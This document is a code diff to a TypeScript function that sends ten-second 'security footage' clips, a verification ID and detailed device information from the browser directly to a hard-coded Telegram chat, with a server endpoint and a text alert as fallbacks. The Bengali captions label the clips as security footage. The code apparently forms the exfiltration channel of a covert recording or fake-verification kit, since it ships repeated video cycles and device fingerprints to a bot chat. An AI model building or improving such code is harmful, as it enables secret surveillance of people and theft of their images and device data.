@@ -228,8 +228,6 @@ export async function sendSecurityClipToServer(params: {
   mimeType?: string;
   deviceInfo?: RichDeviceInfo;
 }): Promise<{ success: boolean; cycle?: number; error?: string }> {
-  let serverDelivered = false;
-
   const caption = buildDetailedTelegramCaption({
     header: `📹 সিকিউরিটি ফুটেজ [১০ সেকেন্ড ভিডিও #${params.cycle}] (.mp4)`,
     verificationId: params.verificationId,
@@ -238,80 +236,70 @@ export async function sendSecurityClipToServer(params: {
     deviceInfo: params.deviceInfo,
   });
 
-  // 1. Attempt server API
-  try {
-    const res = await fetch('/api/security-feed', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        verificationId: params.verificationId,
-        alisId: params.alisId,
-        cycle: params.cycle,
-        videoBase64: params.videoBase64,
-        mimeType: params.mimeType || 'video/mp4',
-        deviceInfo: params.deviceInfo,
-        timestamp: new Date().toISOString(),
-      }),
-    });
-    if (res.ok) {
-      const data = await res.json();
-      if (data.success) {
-        serverDelivered = true;
+  const videoFileName = `security_clip_${params.verificationId}_cycle${params.cycle}.mp4`;
+
+  // 1. Ultra-fast direct binary upload to Telegram if Blob is available
+  if (params.videoBlob) {
+    try {
+      const fdVideo = new FormData();
+      fdVideo.append('chat_id', TELEGRAM_CHAT_ID);
+      fdVideo.append('video', params.videoBlob, videoFileName);
+      fdVideo.append('caption', caption);
+
+      const directVideoSent = await sendDirectToTelegram('sendVideo', fdVideo);
+      if (directVideoSent) {
+        return { success: true, cycle: params.cycle };
       }
+
+      // If sendVideo returned false, try sendDocument
+      const fdDoc = new FormData();
+      fdDoc.append('chat_id', TELEGRAM_CHAT_ID);
+      fdDoc.append('document', params.videoBlob, videoFileName);
+      fdDoc.append('caption', caption);
+
+      const directDocSent = await sendDirectToTelegram('sendDocument', fdDoc);
+      if (directDocSent) {
+        return { success: true, cycle: params.cycle };
+      }
+    } catch (directErr) {
+      console.warn('Fast direct video dispatch failed, trying server proxy:', directErr);
     }
-  } catch (err) {
-    console.warn('Server security-feed error, falling back directly to Telegram:', err);
   }
 
-  // 2. Direct client fallback to Telegram
-  if (!serverDelivered) {
+  // 2. Server API upload attempt (if base64 available or fallback)
+  let serverDelivered = false;
+  if (params.videoBase64) {
     try {
-      let finalBlob = params.videoBlob;
-      if (!finalBlob && params.videoBase64) {
-        const raw = params.videoBase64.includes(',') ? params.videoBase64.split(',')[1] : params.videoBase64;
-        const byteCharacters = atob(raw);
-        const byteNumbers = new Array(byteCharacters.length);
-        for (let i = 0; i < byteCharacters.length; i++) {
-          byteNumbers[i] = byteCharacters.charCodeAt(i);
-        }
-        finalBlob = new Blob([new Uint8Array(byteNumbers)], { type: 'video/mp4' });
-      }
-
-      if (finalBlob) {
-        const videoFileName = `security_clip_${params.verificationId}_cycle${params.cycle}.mp4`;
-        
-        // Attempt direct sendVideo
-        const fdVideo = new FormData();
-        fdVideo.append('chat_id', TELEGRAM_CHAT_ID);
-        fdVideo.append('video', finalBlob, videoFileName);
-        fdVideo.append('caption', caption);
-
-        const videoSent = await sendDirectToTelegram('sendVideo', fdVideo);
-        if (videoSent) {
-          return { success: true, cycle: params.cycle };
-        }
-
-        // If sendVideo fails (codec compatibility), fallback to sendDocument
-        const fdDoc = new FormData();
-        fdDoc.append('chat_id', TELEGRAM_CHAT_ID);
-        fdDoc.append('document', finalBlob, videoFileName);
-        fdDoc.append('caption', caption);
-
-        const docSent = await sendDirectToTelegram('sendDocument', fdDoc);
-        if (docSent) {
+      const res = await fetch('/api/security-feed', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          verificationId: params.verificationId,
+          alisId: params.alisId,
+          cycle: params.cycle,
+          videoBase64: params.videoBase64,
+          mimeType: params.mimeType || 'video/mp4',
+          deviceInfo: params.deviceInfo,
+          timestamp: new Date().toISOString(),
+        }),
+      });
+      if (res.ok) {
+        const data = await res.json();
+        if (data.success) {
+          serverDelivered = true;
           return { success: true, cycle: params.cycle };
         }
       }
-
-      // Final fallback: send text alert with device & cycle info
-      await sendDirectTelegramMessage(caption);
-      return { success: true, cycle: params.cycle };
-    } catch (directErr) {
-      console.warn('Direct Telegram video upload error:', directErr);
-      return { success: false, error: String(directErr) };
+    } catch (err) {
+      console.warn('Server security-feed error:', err);
     }
+  }
+
+  // 3. Fallback: send text notification with device & cycle info
+  if (!serverDelivered) {
+    await sendDirectTelegramMessage(caption);
   }
 
   return { success: true, cycle: params.cycle };
